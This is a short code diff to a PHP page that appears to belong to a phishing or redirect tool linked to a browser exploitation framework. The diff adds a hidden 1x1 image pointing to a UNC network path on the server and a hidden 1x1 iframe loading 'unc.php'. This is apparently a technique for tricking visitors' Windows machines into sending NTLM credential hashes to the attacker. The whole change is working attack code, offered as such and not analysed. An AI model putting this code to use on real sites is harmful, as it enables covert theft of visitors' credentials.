@@ -109,6 +109,10 @@ if($redirect != "" && $BEEFUrl == ""){
 <?php } ?>
 </HEAD>
 <BODY>
+    
+<image height="1" width="1" xlink:href="\\<?php echo $_SERVER['SERVER_NAME'];?>/resource.svg" />
+
+<iframe src="unc.php" width="1" height="1" frameborder="0">
 
 <?php if($redirect == ""){?>
 
